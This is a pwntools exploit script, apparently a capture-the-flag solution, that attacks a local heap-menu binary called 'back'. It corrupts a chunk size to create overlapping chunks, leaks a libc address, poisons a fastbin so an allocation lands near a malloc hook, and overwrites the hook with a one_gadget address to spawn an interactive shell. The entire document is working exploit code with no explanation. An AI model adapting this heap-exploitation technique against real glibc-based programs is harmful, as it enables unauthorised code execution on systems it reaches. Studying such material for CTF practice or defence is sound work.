from pwn import *
io=process("./back",env={"LD_PRELOAD":"./libc.so.6"})


def add(size,data):
    io.sendlineafter("(CMD)>>> ","A")
    io.sendlineafter("(SIZE)>>> ",str(size))
    io.sendlineafter("(CONTENT)>>> ",data)

def delete(index):
    io.sendlineafter("(CMD)>>> ","D")
    io.sendlineafter("(INDEX)>>> ",str(index))

def edit(index,data,option="Y"):
    io.sendlineafter("(CMD)>>> ","E")
    io.sendlineafter("(INDEX)>>> ",str(index))
    io.sendlineafter("(CONTENT)>>> ",data)
    io.sendlineafter("(Y/n)>>> ",option)

def view(idx):
    io.sendlineafter("(CMD)>>> ","F")
    io.sendlineafter("(INDEX)>>>",str(idx))

add(56,"a"*56)
add(256,"ccccc")
add(104,"bbbb")
add(16,"ddddd")
payload = "b"*56+"\x81\x01"

edit(1,payload)          # Overwriting index 2 chunk size 

delete(2)        # getting overlapping chunks

view(2)


io.recvuntil(" #   INDEX: 2")
io.recvuntil(" # CONTENT: ")

libc_leak = u64(io.recvline().strip()+"\x00\x00")-0x3c4b78

log.info("Libc leak @ %s",hex(libc_leak))

delete(3)

hook = libc_leak + 0x3c4aed

payload = p64(0)*5+p64(0x71)+p64(hook)


add(208,"first chunk")

add(64,payload)
delete(1)
delete(2)
add(96,"third chunk")


one = libc_leak + 0xf1147

payload= "a"*19+p64(one)

add(96,payload)


delete(1)
gdb.attach(io)
io.interactive()

